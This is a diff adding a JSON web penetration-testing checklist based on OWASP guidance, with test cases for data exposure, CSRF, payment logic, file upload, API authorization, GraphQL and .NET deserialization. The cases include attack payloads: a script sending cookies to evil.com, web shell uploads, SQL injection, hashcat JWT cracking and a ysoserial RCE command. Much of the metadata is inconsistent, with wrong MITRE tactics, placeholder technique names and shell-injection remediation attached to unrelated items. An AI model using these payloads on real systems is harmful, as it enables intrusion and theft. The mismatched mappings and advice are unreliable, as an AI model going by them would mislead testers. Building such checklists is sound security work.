+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "gobuster",
+            "feroxbuster",
+            "ffuf",
+            "SecLists"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P7",
+      "name": "Sensitive Data Exposure",
+      "scope": "endpoint",
+      "items": [
+        {
+          "id": "WSTG-CRYP-03",
+          "name": "Sensitive Data in Transit",
+          "sev": "critical",
+          "mitre_tactic": "Defense Evasion",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Defense Evasion"
+          ],
+          "cwe": [
+            "CWE-319"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Verify all sensitive data is transmitted exclusively over encrypted channels, with no exceptions.",
+          "cases": [
+            "Proxy all traffic in Burp \u2014 any HTTP (not HTTPS) requests containing credentials or session tokens?",
+            "Load login page on HTTP \u2014 forces redirect to HTTPS before form appears?",
+            "Mixed content on HTTPS pages: HTTP resources (images, scripts, fonts) loaded?",
+            "API calls: do any send Bearer tokens over HTTP?",
+            "HSTS header on all subdomains? Check includeSubDomains flag",
+            "WebSocket: wss:// (encrypted) or ws:// (plaintext)?",
+            "Check HSTS preload list status for the domain"
+          ],
+          "expected": "100% of traffic over HTTPS. HSTS with includeSubDomains. No mixed content. WebSockets use wss://.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite",
+            "Browser DevTools Network tab"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "DATA-01",
+          "name": "Excessive Data Exposure in API Responses",
+          "sev": "high",
+          "mitre_tactic": "Defense Evasion",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Defense Evasion"
+          ],
+          "cwe": [
+            "CWE-200"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Review all API responses for fields returned but never displayed in the UI \u2014 excessive data exposure.",
+          "cases": [
+            "Compare API response JSON fields vs fields visible in UI \u2014 extra undisplayed fields?",
+            "GET /api/users/me \u2192 returns password_hash, internal_id, balance, created_by?",
+            "GET /api/products \u2192 returns cost_price, supplier_id, margin alongside public fields?",
+            "GET /api/users (list) \u2192 returns all user details instead of just name/id?",
+            "Check nested objects: does order API return full customer object or just customer ID?",
+            "Filter applied client-side? If all data sent and frontend hides some = vulnerability"
+          ],
+          "expected": "API returns minimum necessary data. No sensitive fields (password, PAN, SSN, internal IDs) in any response.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "DATA-02",
+          "name": "Sensitive Data in JavaScript & Source",
+          "sev": "high",
+          "mitre_tactic": "Defense Evasion",
+          "mitre_technique": [
+            "T1552 - Standard Technique"
+          ],
+          "mitre": [
+            "T1552"
+          ],
+          "cwe": [
+            "CWE-200"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Review JavaScript bundles, source maps, and HTML for credentials, keys, and internal configuration.",
+          "cases": [
+            "Search JS: apiKey, api_key, password, secret, Bearer, connectionString, AWS_ACCESS_KEY",
+            "Check for .js.map files \u2192 expose original TypeScript/source pre-compilation",
+            "HTML comments: <!-- TODO: remove password | <!-- admin@internal.com -->",
+            "meta tags: generator info, internal build IDs, version numbers",
+            "Check environment variables bundled in frontend: REACT_APP_API_KEY, VUE_APP_SECRET",
+            "localStorage.setItem() in JS for sensitive token storage",
+            "Search for: 192.168. | 10.0. | .internal | .corp | .local in JS files"
+          ],
+          "expected": "No credentials, tokens, API keys, or internal infrastructure details in any client-side code.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "Browser DevTools Sources",
+            "Burp filter .js .map",
+            "grep",
+            "LinkFinder"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "DATA-03",
+          "name": "Backup & Config File Exposure",
+          "sev": "critical",
+          "mitre_tactic": "Defense Evasion",
+          "mitre_technique": [
+            "T1552 - Standard Technique"
+          ],
+          "mitre": [
+            "T1552"
+          ],
+          "cwe": [
+            "CWE-538"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test for accessible backup files, configuration, and source control repositories.",
+          "cases": [
+            "Try: /web.config | /appsettings.json | /appsettings.Development.json",
+            "Try: /web.config.bak | /web.config.old",
+            "Try: /.git/config | /.git/HEAD | /.git/COMMIT_EDITMSG",
+            "Try: /.env | /.env.production | /.env.backup | /.env.local",
+            "Try: /database.sql | /backup.zip | /db_backup.sql",
+            "gobuster with backup file wordlist: SecLists/Discovery/Web-Content/Common-DB-Backups.txt"
+          ],
+          "expected": "Config files not web-accessible. .git directory blocked. Backup files absent from web root.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "gobuster",
+            "feroxbuster",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "DATA-04",
+          "name": "Browser Caching & Autocomplete",
+          "sev": "low",
+          "mitre_tactic": "Defense Evasion",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Defense Evasion"
+          ],
+          "cwe": [
+            "CWE-524"
+          ],
+          "cvss_score": "3.8 (Low)",
+          "how": "Test for sensitive data cached in browser and autocomplete enabled on sensitive fields.",
+          "cases": [
+            "Inspect Cache-Control headers on sensitive pages: should include no-store",
+            "After viewing sensitive page: browser Back button \u2192 stale cached data shown?",
+            "Password fields: autocomplete=\"off\" or autocomplete=\"new-password\" set?",
+            "Credit card fields: autocomplete=\"off\" set?",
+            "OTP/PIN fields: autocomplete=\"off\" set?",
+            "Browser history: are session tokens visible in URL history?"
+          ],
+          "expected": "Sensitive pages have Cache-Control: no-store. Sensitive form fields have autocomplete=\"off\".",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Browser DevTools",
+            "Burp",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-CRYP-04",
+          "name": "Weak Cryptography Testing",
+          "sev": "high",
+          "mitre_tactic": "Defense Evasion",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Defense Evasion"
+          ],
+          "cwe": [
+            "CWE-326",
+            "CWE-327"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test for weak or obsolete cryptographic algorithms for passwords, tokens, and encrypted data.",
+          "cases": [
+            "Password hash disclosure: any MD5 or SHA-1 hashes in response/DB errors? (need bcrypt/argon2)",
+            "Token entropy: run password reset tokens through Burp Sequencer \u2014 low entropy?",
+            "Test JWT HMAC secret strength: hashcat -a 0 -m 16500 token.txt rockyou.txt",
+            "ECB mode detection: encrypt two identical plaintext blocks \u2192 same ciphertext = ECB",
+            "Hardcoded IV/nonce: always same IV = deterministic encryption = weak",
+            "Symmetric key in config file or JS: hardcoded AES keys",
+            "Check: is encryption used where hashing should be? (passwords encrypted, not hashed)"
+          ],
+          "expected": "Passwords hashed with bcrypt/argon2/scrypt. Tokens have >=128 bits entropy. No hardcoded keys. No MD5/SHA-1 for passwords.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Sequencer",
+            "hashcat",
+            "Manual"
+          ],
+          "command_template": "testssl.sh --quiet --color 0 \"{{HOST}}:{{PORT}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P8",
+      "name": "CSRF & Business Logic",
+      "scope": "endpoint",
+      "items": [
+        {
+          "id": "WSTG-SESS-05",
+          "name": "CSRF Token Validation",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-352"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test if CSRF tokens are present and properly validated on ALL state-changing requests.",
+          "cases": [
+            "Identify state-changing POST/PUT/DELETE requests (any that modify data)",
+            "Remove CSRF token entirely \u2192 request still succeeds? (FAIL if yes)",
+            "Submit empty string CSRF token \u2192 succeeds? (FAIL if yes)",
+            "Submit random invalid CSRF token \u2192 succeeds? (FAIL if yes)",
+            "Cross-user: use CSRF token from User A in User B session \u2192 accepted? (should fail)",
+            "Content-type confusion: send JSON CSRF payload as application/x-www-form-urlencoded",
+            "Request without Origin or Referer header \u2192 still processed? SameSite cookie bypass?",
+            ".NET: AntiForgeryToken present on ALL Razor/MVC forms?",
+            "Create PoC HTML page: <form action=\"https://target.com/transfer\" method=\"POST\">..."
+          ],
+          "expected": "CSRF tokens required and validated on all state-changing requests. Tokens session-bound. Invalid tokens return 400/403.",
+          "recommendation": "Implement anti-CSRF tokens (Synchronizer Token Pattern) validated on all state-changing requests, and configure SameSite=Strict or SameSite=Lax on all session cookies.",
+          "tools": [
+            "Burp Repeater",
+            "Manual CSRF PoC HTML"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-BUSL-01",
+          "name": "Business Logic Data Validation",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-20"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test for negative values, zero values, out-of-range inputs, and boundary conditions in business logic.",
+          "cases": [
+            "Cart quantity=-1 (negative \u2014 could result in credit/refund)",
+            "Cart quantity=0",
+            "Cart quantity=999999 (integer overflow check)",
+            "Price field in hidden input: change to 0.01",
+            "Price=-1 (negative price = credit balance increase?)",
+            "Apply same discount code twice in rapid succession",
+            "Discount >100%: code that reduces to negative price?",
+            "Transfer amount=0 | amount=0.000001 | amount=2147483648 (INT_MAX+1)",
+            "Date fields: test past dates, future dates, 1970-01-01, 9999-12-31"
+          ],
+          "expected": "Server-side validation enforces all business rules. Negative values, overflow, and zero rejected. All validation server-side.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Repeater",
+            "Burp Intruder",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-BUSL-04",
+          "name": "Race Conditions / TOCTOU",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-362"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test single-use operations for race conditions using concurrent requests.",
+          "cases": [
+            "Identify single-use resources: discount codes, invite links, vote buttons, limited stock",
+            "Burp Repeater: send 10-20 identical requests simultaneously (Send group in parallel)",
+            "Apply same coupon code from 20 concurrent sessions",
+            "Create same username from 2 concurrent requests \u2192 which wins?",
+            "Withdraw same funds from 2 concurrent requests \u2192 double spend?",
+            "Book last item in inventory from 2 concurrent requests \u2192 2 bookings?",
+            "Turbo Intruder: 100+ concurrent requests for high-frequency race condition testing"
+          ],
+          "expected": "Atomic operations enforced via database transactions. Only one success returned for concurrent single-use operations.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Repeater (parallel)",
+            "Turbo Intruder",
+            "Custom concurrent scripts"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-BUSL-06",
+          "name": "Multi-Step Workflow Bypass",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-841"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test multi-step workflows by skipping steps to reach later stages without completing prerequisites.",
+          "cases": [
+            "Checkout: go direct to /checkout/confirm without completing /checkout/shipping",
+            "Password reset: skip to /reset-password without completing email verification step",
+            "MFA: skip MFA page after login step 1 \u2192 access main app directly?",
+            "Email verification: access verified-only features without clicking verification link",
+            "Account setup wizard: skip steps 2-5 \u2192 access main application?",
+            "Premium feature: access /premium/feature URL directly as free-tier user"
+          ],
+          "expected": "Workflow state enforced server-side. Each step validates all prerequisite steps completed. No step-skipping possible.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Repeater",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-BUSL-10",
+          "name": "Payment Functionality Testing",
+          "sev": "critical",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-840"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test payment flows for price manipulation, currency tampering, and negative value abuse.",
+          "cases": [
+            "Intercept checkout POST \u2192 modify total_price=0.01 in body",
+            "Change currency code: USD \u2192 BTC \u2192 VND (lower value currency)",
+            "Negative quantity: quantity=-1 (credit to account?)",
+            "Apply multiple discount codes simultaneously (should be limited)",
+            "Refund more than original purchase amount",
+            "Add item to cart at price A, change to price B after price-locking step",
+            "Coupon single-use: apply same code from 2 sessions simultaneously",
+            "Payment skip: initiate payment, navigate directly to /order/confirmation URL"
+          ],
+          "expected": "Price calculated server-side only. Client-supplied price/currency rejected. Single-use coupons atomically enforced.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-BUSL-09",
+          "name": "Malicious File Upload",
+          "sev": "critical",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1505 - Standard Technique"
+          ],
+          "mitre": [
+            "T1505"
+          ],
+          "cwe": [
+            "CWE-434"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test file upload functionality to upload web shells and bypass extension/MIME type restrictions.",
+          "cases": [
+            "Upload: shell.aspx (ASP.NET web shell directly)",
+            "Double extension: shell.aspx.jpg",
+            "Null byte: shell.aspx%00.jpg",
+            "Case variation: shell.ASPX | shell.aSPx | shell.aSpX",
+            "Content-Type mismatch: keep .aspx ext, change Content-Type: image/jpeg",
+            "SVG XSS: <svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.domain)</script></svg>",
+            "HTML upload: <script>document.location=\"https://evil.com/?c=\"+document.cookie</script>",
+            "Path traversal in filename: ../../shell.aspx | ../wwwroot/shell.aspx",
+            "Polyglot: valid GIF89a header + embedded ASPX code",
+            "After upload: try accessing file directly via URL \u2192 is it executable?"
+          ],
+          "expected": "Uploaded files stored outside web root. Extension whitelist enforced. MIME validated server-side. Uploaded files not executable.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Repeater",
+            "Manual",
+            "weevely (ASPX shells)"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P9",
+      "name": "API Security",
+      "scope": "endpoint",
+      "items": [
+        {
+          "id": "API1",
+          "name": "API1:2023 \u2014 Broken Object Level Authorization",
+          "sev": "critical",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1078 - Standard Technique"
+          ],
+          "mitre": [
+            "T1078"
+          ],
+          "cwe": [
+            "CWE-639"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test every API endpoint with resource IDs for access control at the object level using two test accounts.",
+          "cases": [
+            "GET /api/users/101 \u2192 change to /api/users/102 with same auth token",
+            "GET /api/orders/500 \u2192 /api/orders/501 \u2192 /api/orders/1",
+            "GET /api/documents/abc \u2192 enumerate other document IDs",
+            "User A token: GET /api/users/B-id/profile \u2192 should 403",
+            "Remove Authorization header entirely \u2192 unauthenticated access?",
+            "Test all ID types: int, UUID, Base64, custom hash",
+            "API v1 vs v2: does /api/v1/ have weaker auth than /api/v2/?",
+            "Batch endpoint: /api/users?ids=101,102,103 \u2192 returns all users data?"
+          ],
+          "expected": "Every API resource access validated against requesting user session. 403 returned for unauthorized resource access.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "Burp Intruder",
+            "Autorize",
+            "Manual \u2014 2 accounts"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "API2",
+          "name": "API2:2023 \u2014 Broken Authentication",
+          "sev": "critical",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1078 - Standard Technique"
+          ],
+          "mitre": [
+            "T1078"
+          ],
+          "cwe": [
+            "CWE-287"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test API authentication mechanisms for weaknesses in token validation and transmission.",
+          "cases": [
+            "Call API with expired token \u2192 401 returned?",
+            "Call API with no Authorization header \u2192 401 returned?",
+            "Call API with malformed/truncated token \u2192 401 returned?",
+            "Call API with token from different environment (dev token on prod) \u2192 rejected?",
+            "API key in URL: ?api_key=xxx \u2192 insecure (should be in header)",
+            "Basic Auth: credentials over HTTP? Credentials in URL?",
+            "API key rotation: old key still works after rotation? (Should be invalidated)",
+            "Token binding: can stolen token be used from different IP/User-Agent?"
+          ],
+          "expected": "All API endpoints require valid, non-expired tokens. Tokens in Authorization header. Old/revoked tokens rejected.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "API3",
+          "name": "API3:2023 \u2014 Broken Object Property Level Authorization",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-200",
+            "CWE-915"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test if APIs return more data than shown in UI, and if mass assignment filters work.",
+          "cases": [
+            "Compare full API response vs UI-displayed fields \u2014 hidden fields returned?",
+            "/api/users/me \u2192 includes password_hash, internal_id, admin_notes, balance?",
+            "/api/products \u2192 returns cost_price, supplier_margin, stock_level to buyers?",
+            "PATCH /api/users/me with extra: {\"isAdmin\":true,\"role\":\"admin\"} \u2192 applied?",
+            "PUT /api/orders/1 with status:\"paid\" \u2192 status changes without payment?",
+            "POST new resource with extra privileged fields \u2192 are they saved?"
+          ],
+          "expected": "API returns minimum data per operation. All write operations only apply whitelisted fields.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "API4",
+          "name": "API4:2023 \u2014 Unrestricted Resource Consumption",
+          "sev": "medium",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-770"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Test API endpoints for absence of rate limiting and resource consumption controls.",
+          "cases": [
+            "Send 100+ rapid requests to login endpoint \u2192 429 Too Many Requests returned?",
+            "Test OTP endpoint: 100 requests \u2192 rate limited?",
+            "Large payload: send 10MB+ JSON body \u2192 server handles gracefully? Memory issue?",
+            "Deeply nested JSON: {\"a\":{\"a\":{\"a\":...}}} \u2192 parsing DoS?",
+            "Pagination: GET /api/items?limit=99999 \u2192 server enforces max page size?",
+            "X-Forwarded-For bypass: rotate header values to bypass IP-based rate limiting",
+            "GraphQL batching: send 1000 queries in one request \u2192 rate limited?"
+          ],
+          "expected": "Rate limiting enforced (429). Max payload size enforced. Pagination size capped. Rate limit cannot be bypassed via IP headers.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "Burp Intruder",
+            "Turbo Intruder",
+            "curl"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "API5",
+          "name": "API5:2023 \u2014 Broken Function Level Authorization",
+          "sev": "critical",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1548 - Standard Technique"
+          ],
+          "mitre": [
+            "T1548"
+          ],
+          "cwe": [
+            "CWE-285"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test if regular users can call admin-level API functions by calling them directly.",
+          "cases": [
+            "POST /api/admin/users as regular user \u2192 403?",
+            "DELETE /api/admin/users/1 as regular user \u2192 403?",
+            "GET /api/admin/reports as regular user \u2192 403?",
+            "PUT /api/users/102/role with {\"role\":\"admin\"} as regular user \u2192 403?",
+            "POST /api/products (create product) as buyer role \u2192 403?",
+            "GET /api/admin/users \u2014 HTTP method switch: try GET if POST is documented",
+            "Access undocumented admin endpoints found in JS files"
+          ],
+          "expected": "Function-level authorization enforced server-side. Admin API endpoints return 403 for non-admin authenticated tokens.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Repeater",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "API6",
+          "name": "API6-8:2023 \u2014 Mass Assignment, Misconfiguration, Injection",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-16",
+            "CWE-915"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test API-specific mass assignment, security misconfiguration, and injection issues.",
+          "cases": [
+            "Mass assignment: POST with {\"name\":\"x\",\"isAdmin\":true,\"balance\":99999}",
+            "Swagger exposed: /swagger | /api-docs | /openapi.json \u2192 blocked in prod?",
+            "CORS: Access-Control-Allow-Origin: * with credentials? Permissive origin policy?",
+            "API over HTTP: any API endpoint accessible without TLS?",
+            "GraphQL injection: {user(id:\"1 UNION...\")} or SSTI in arguments",
+            "Error verbosity: do API errors expose stack traces, SQL errors, internal paths?",
+            "Unnecessary HTTP methods on API: DELETE/PUT on read-only endpoints?"
+          ],
+          "expected": "Swagger absent in production. CORS restrictive. All API endpoints over HTTPS. Generic error messages.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite",
+            "Browser",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-APIT-99",
+          "name": "GraphQL Security Testing",
+          "sev": "high",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Initial Access"
+          ],
+          "cwe": [
+            "CWE-284"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test GraphQL endpoints for introspection, authorization bypass, injection, and denial of service.",
+          "cases": [
+            "Introspection: {__schema{types{name}}} \u2192 disabled in production? (Must be)",
+            "Field suggestion: send invalid field \u2192 \"Did you mean...?\" leaks schema structure",
+            "Query all fields on object types \u2192 excessive data exposure?",
+            "Authorization: query {user(id:1){secretField}} as unauthorized user \u2192 403?",
+            "Injection in args: {user(id:\"1; DROP TABLE users--\")} | SSTI in string args",
+            "Batching DoS: send 1000 queries in single request \u2192 rate limited?",
+            "Alias attack: multiple queries in one request bypassing rate limits",
+            "Nested query DoS: {a{b{c{d{e{f{...}}}}}}} \u2192 depth limit enforced?"
+          ],
+          "expected": "Introspection disabled. Per-field authorization enforced. Query depth/complexity limits set. Batching rate-limited.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "GraphQL Playground",
+            "Burp InQL extension",
+            "Altair",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P10",
+      "name": ".NET Specific",
+      "scope": "endpoint",
+      "items": [
+        {
+          "id": "NET-01",
+          "name": "ViewState Deserialization (MAC Disabled)",
+          "sev": "critical",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1059 - Standard Technique"
+          ],
+          "mitre": [
+            "T1059"
+          ],
+          "cwe": [
+            "CWE-502"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test if ViewState MAC validation is disabled, enabling RCE via crafted deserialization payload.",
+          "cases": [
+            "Find __VIEWSTATE field in form HTML source",
+            "Tamper one byte in Base64 ViewState value \u2192 resubmit",
+            "Expected: MAC validation error (ViewState is invalid) \u2014 this is GOOD",
+            "Not expected: page loads normally with tampered ViewState \u2014 MAC DISABLED = CRITICAL",
+            "If MAC disabled: ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"whoami > C:\\inetpub\\wwwroot\\poc.txt\"",
+            "Submit crafted ViewState \u2192 check for /poc.txt \u2192 confirm RCE",
+            "Machine key discovery: Blacklist3r \u2014 try known default machine keys list",
+            "Verify web.config: enableViewStateMac=\"false\" or viewStateEncryptionMode=\"Never\""
+          ],
+          "expected": "ViewState MAC validation always enabled. Tampered ViewState causes InvalidViewStateException. Machine key not exposed.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "ysoserial.net",
+            "Blacklist3r",
+            "AspDotNetWrapper",
+            "Burp Decoder"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "NET-02",
+          "name": ".NET Deserialization (Json.NET / BinaryFormatter)",
+          "sev": "critical",
+          "mitre_tactic": "Initial Access",
+          "mitre_technique": [
+            "T1059 - Standard Technique"
+          ],
+          "mitre": [
+            "T1059"
+          ],
+          "cwe": [
+            "CWE-502"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test .NET JSON and binary deserialization endpoints for arbitrary type instantiation and RCE.",
+          "cases": [
+            "Test JSON.NET $type: add \"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\" to JSON body",
+            "Json.NET gadget: $type \u2192 Windows.Data \u2192 RCE via Process.Start",
